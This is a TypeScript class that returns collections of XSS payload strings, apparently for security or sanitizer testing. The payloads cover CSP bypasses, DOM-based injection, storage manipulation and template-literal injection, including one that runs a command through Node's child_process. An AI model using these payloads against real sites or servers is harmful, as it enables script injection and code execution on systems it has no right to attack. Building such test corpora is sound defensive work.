/**
 * Advanced XSS payload vectors.
 * @description Sophisticated XSS attack techniques.
 */
export class AdvancedVector {
  /**
   * Get all advanced vectors.
   * @description Returns all advanced XSS payload collections.
   * @returns Array of advanced XSS payload strings
   */
  static all(): string[] {
    return [...this.templateLiterals(), ...this.cspBypass(), ...this.domBased(), ...this.selfXss()]
  }

  /**
   * Get CSP bypass vectors.
   * @description Payloads that bypass Content Security Policy.
   * @returns Array of CSP bypass XSS strings
   */
  static cspBypass(): string[] {
    return [
      '<meta http-equiv="Content-Security-Policy" content="script-src \'unsafe-inline\'">',
      '<script src="data:text/javascript,alert(1)"></script>',
      '<object data="data:text/html,<script>alert(1)</script>">',
      '<embed src="data:text/javascript,alert(1)">',
      '<iframe srcdoc="<script>alert(1)</script>">',
      '<link rel="preload" href="data:text/javascript,alert(1)" as="script">',
      '<style>@import "data:text/css,{}";*{color:red;}</style>'
    ]
  }

  /**
   * Get DOM-based vectors.
   * @description DOM manipulation XSS payloads.
   * @returns Array of DOM-based XSS strings
   */
  static domBased(): string[] {
    return [
      '#<img src=x onerror=alert(1)>',
      '<script>document.location="javascript:alert(1)"</script>',
      '<script>window.location="javascript:alert(1)"</script>',
      '<script>document.write("<img src=x onerror=alert(1)>")</script>',
      '<div id="test"></div><script>test.innerHTML="<img src=x onerror=alert(1)>"></script>',
      '<script>eval(location.hash.slice(1))</script>',
      "<script>setTimeout('alert(1)',0)</script>",
      '<script>document.body.innerHTML="<img src=x onerror=alert(1)>"></script>'
    ]
  }

  /**
   * Get self-XSS vectors.
   * @description Persistent storage XSS payloads.
   * @returns Array of self-XSS payload strings
   */
  static selfXss(): string[] {
    return [
      '<script>localStorage.xss=1</script>',
      '<script>sessionStorage.xss="alert(1)"</script>',
      '<script>document.cookie="xss=test;path=/"</script>',
      '<script>console.log(localStorage.xss)</script>',
      '<img src=x onerror="localStorage.xss=alert(1)">',
      '<script>if(localStorage.xss){alert(localStorage.xss)}</script>',
      '<script>document.title="XSS";history.pushState({},\'\')',
      "<script>navigator.sendBeacon('data:text/plain,'+btoa(localStorage.xss))</script>"
    ]
  }

  /**
   * Get template literal vectors.
   * @description Template literal injection payloads.
   * @returns Array of template literal XSS strings
   */
  static templateLiterals(): string[] {
    return [
      '${alert(1)}',
      '`alert(1)`',
      "${constructor.constructor('alert(1)')()}",
      "${globalThis.process.mainModule.require('child_process').execSync('calc')}",
      '${String.raw`\\${alert(1)}`}',
      "${Reflect.apply(console, ['log', alert(1)])}",
      "${eval('alert(1)')}",
      "${Function('alert(1)')()}",
      "${setTimeout('alert(1)',0)}"
    ]
  }
}
